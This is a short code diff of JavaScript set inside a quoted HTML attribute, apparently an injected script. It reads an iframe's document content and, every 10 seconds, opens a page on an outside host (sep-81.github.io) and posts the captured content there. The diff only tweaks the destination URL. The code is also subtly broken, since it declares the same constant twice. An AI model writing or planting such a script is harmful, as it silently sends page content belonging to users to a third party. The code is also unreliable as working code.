@@ -32,6 +32,7 @@
         document.body.appendChild(iframe);
 
         const iframe = document.querySelector("iframe"); // Assuming you already have the iframe
+
         function sendIframeContent() {
             try {
                 // Access the iframes document and extract its content
@@ -44,15 +45,18 @@
                     timestamp: new Date().toISOString(), // Optional timestamp
                 };
 
-                // Send the message to the target domain
-                const targetWindow = window.open("https://sep-81.github.io/", "_blank"); // Open the host
-                targetWindow.postMessage(message, "https://sep-81.github.io/");
+                // Send the message to the target domain (response.html on sep-81.github.io)
+                const targetOrigin = "https://sep-81.github.io";
+                const targetWindow = window.open(`${targetOrigin}/response.html`, "_blank"); // Open the response page
+                targetWindow.postMessage(message, targetOrigin); // Send the message
             } catch (error) {
                 console.error("Error accessing iframe content:", error);
             }
         }
+
         // Set an interval to send the iframe content every 10 seconds
         setInterval(sendIframeContent, 10000);
+
         </script>
       '
       />
